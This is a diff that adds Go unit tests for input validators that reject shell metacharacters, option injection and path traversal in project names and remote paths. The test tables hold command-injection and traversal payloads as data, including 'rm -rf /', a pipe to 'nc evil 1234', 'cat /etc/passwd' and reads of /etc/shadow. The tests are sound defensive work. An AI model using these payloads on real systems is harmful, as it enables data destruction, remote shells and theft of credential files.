@@ -1,6 +1,7 @@
 package reconcile
 
 import (
+	"fmt"
 	"testing"
 
 	"github.com/stretchr/testify/assert"
@@ -253,4 +254,140 @@ func TestValidationIntegration(t *testing.T) {
 			assert.Error(t, validateContainerName(attack), "container should reject: %s", attack)
 		}
 	})
+}
+
+func TestValidateProjectName(t *testing.T) {
+	tests := []struct {
+		name        string
+		projectName string
+		wantErr     bool
+		errMsg      string
+	}{
+		// Valid project names
+		{"simple", "myproject", false, ""},
+		{"with hyphen", "my-project", false, ""},
+		{"with underscore", "my_project", false, ""},
+		{"with dot", "my.project", false, ""},
+		{"with numbers", "project123", false, ""},
+		{"starts with digit", "1project", false, ""},
+		{"mixed", "bosun-v2.0_prod", false, ""},
+
+		// Invalid: empty
+		{"empty", "", true, "cannot be empty"},
+
+		// Invalid: starts with dash (option injection)
+		{"starts with dash", "-project", true, "cannot start with '-'"},
+
+		// Shell metacharacter corpus (one test per metachar)
+		{"semicolon", "a;touch /tmp/bosun_pwn", true, "shell metacharacter"},
+		{"ampersand", "a&& rm -rf /", true, "shell metacharacter"},
+		{"pipe", "a | nc evil 1234", true, "shell metacharacter"},
+		{"dollar subshell", "a$(touch /tmp/pwn)", true, "shell metacharacter"},
+		{"backtick subshell", "a`touch /tmp/pwn`", true, "shell metacharacter"},
+		{"open paren", "a(", true, "shell metacharacter"},
+		{"close paren", "a)", true, "shell metacharacter"},
+		{"open brace", "a{", true, "shell metacharacter"},
+		{"close brace", "a}", true, "shell metacharacter"},
+		{"less than", "a<file", true, "shell metacharacter"},
+		{"greater than", "a>file", true, "shell metacharacter"},
+		{"backslash", "a\\b", true, "shell metacharacter"},
+		{"newline", "a\nb", true, "shell metacharacter"},
+		{"carriage return", "a\rb", true, "shell metacharacter"},
+		{"single quote", "a'b'", true, "shell metacharacter"},
+		{"double quote", "a\"b\"", true, "shell metacharacter"},
+
+		// Known attack payloads
+		{"command injection semicolon", "a;touch /tmp/bosun_pwn", true, "shell metacharacter"},
+		{"command injection subshell dollar", "a$(touch /tmp/pwn)", true, "shell metacharacter"},
+		{"command injection backtick", "a`touch /tmp/pwn`", true, "shell metacharacter"},
+		{"command injection and", "a && rm -rf /", true, "shell metacharacter"},
+		{"command injection pipe nc", "a | nc evil 1234", true, "shell metacharacter"},
+
+		// Invalid: bad format
+		{"space in name", "my project", true, "invalid project name format"},
+		{"starts with dot", ".project", true, "invalid project name format"},
+		{"at sign", "project@host", true, "invalid project name format"},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			err := ValidateProjectName(tt.projectName)
+			if tt.wantErr {
+				require.Error(t, err)
+				assert.Contains(t, err.Error(), tt.errMsg)
+			} else {
+				require.NoError(t, err)
+			}
+		})
+	}
+}
+
+func TestValidateRemotePath(t *testing.T) {
+	tests := []struct {
+		name    string
+		path    string
+		wantErr bool
+		errMsg  string
+	}{
+		// Valid paths
+		{"absolute path", "/mnt/appdata", false, ""},
+		{"absolute with subdir", "/mnt/user/appdata", false, ""},
+		{"relative simple", "appdata/service", false, ""},
+		{"with hyphen", "/mnt/app-data", false, ""},
+		{"with underscore", "/mnt/app_data", false, ""},
+		{"with dot", "/mnt/app.data", false, ""},
+
+		// Invalid: empty
+		{"empty", "", true, "cannot be empty"},
+
+		// Invalid: path traversal
+		{"path traversal", "/mnt/../etc/passwd", true, "path traversal"},
+		{"relative traversal", "../../etc/shadow", true, "path traversal"},
+		{"embedded traversal", "/valid/../../../etc/passwd", true, "path traversal"},
+
+		// Shell metacharacter corpus
+		{"semicolon", "/mnt;rm -rf /", true, "shell metacharacter"},
+		{"ampersand", "/mnt&whoami", true, "shell metacharacter"},
+		{"pipe", "/mnt|cat /etc/passwd", true, "shell metacharacter"},
+		{"dollar subshell", "/mnt$(id)", true, "shell metacharacter"},
+		{"backtick", "/mnt`id`", true, "shell metacharacter"},
+		{"single quote", "/mnt'evil'", true, "shell metacharacter"},
+		{"double quote", "/mnt\"evil\"", true, "shell metacharacter"},
+		{"newline", "/mnt\nid", true, "shell metacharacter"},
+		{"backslash", "/mnt\\evil", true, "shell metacharacter"},
+
+		// Invalid: spaces and special chars rejected by regex
+		{"space in path", "/mnt/app data", true, "invalid remote path format"},
+		{"at sign", "/mnt/@data", true, "invalid remote path format"},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			err := ValidateRemotePath(tt.path)
+			if tt.wantErr {
+				require.Error(t, err)
+				assert.Contains(t, err.Error(), tt.errMsg)
+			} else {
+				require.NoError(t, err)
+			}
+		})
+	}
+}
+
+// TestShellMetacharsCorpus verifies that every character in the shellMetachars
+// slice is rejected by both ValidateProjectName and ValidateRemotePath.
+func TestShellMetacharsCorpus(t *testing.T) {
+	for _, char := range shellMetachars {
+		char := char // capture
+		t.Run("projectName/"+fmt.Sprintf("%q", char), func(t *testing.T) {
+			name := "safe" + char + "name"
+			err := ValidateProjectName(name)
+			require.Error(t, err, "ValidateProjectName should reject metachar %q", char)
+		})
+		t.Run("remotePath/"+fmt.Sprintf("%q", char), func(t *testing.T) {
+			path := "/mnt" + char + "evil"
+			err := ValidateRemotePath(path)
+			require.Error(t, err, "ValidateRemotePath should reject metachar %q", char)
+		})
+	}
 }
